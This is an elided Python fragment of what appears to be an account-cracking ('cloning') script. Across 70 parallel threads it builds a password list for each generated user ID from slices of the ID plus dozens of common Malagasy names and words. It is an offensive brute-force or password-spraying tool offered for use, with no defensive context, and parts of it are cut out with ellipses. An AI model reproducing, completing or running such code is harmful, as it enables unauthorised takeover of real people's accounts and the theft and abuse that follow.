...
def BD_CLONING():
    ...
    with tred(max_workers=70) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'narovana','tanjona','nantenaina','angelo','marary','faniry','riantsoa','finaritra','tsilavina','valisoa','mandresy','fitahina','fifalina','fanomezana','mampionona','mamisoa','tahiry','harena','kantoniaina','maminirina','fandresena','nilaina','tantely','tolotra','sitraka','antananarivo','badoda','mahery','mihary','fiderana','fahendrena','miangola','mandresy','fanantenana','Fanantenana','fahendrena','milely','fiderana','fanomezana','santatra','lahatra','sitraka','finoana','miangola','anjarako','malalako','badoda','Badoda','nomena','Nomena','faniry','Faniry','jesosy','Jesosy','fanantenana','Fanantenana','hasina','Hasina','finoana','fandresena','fiderana','rojotina','mamisoa','nirina','finiavana','mihary','liantsoa','fafara']
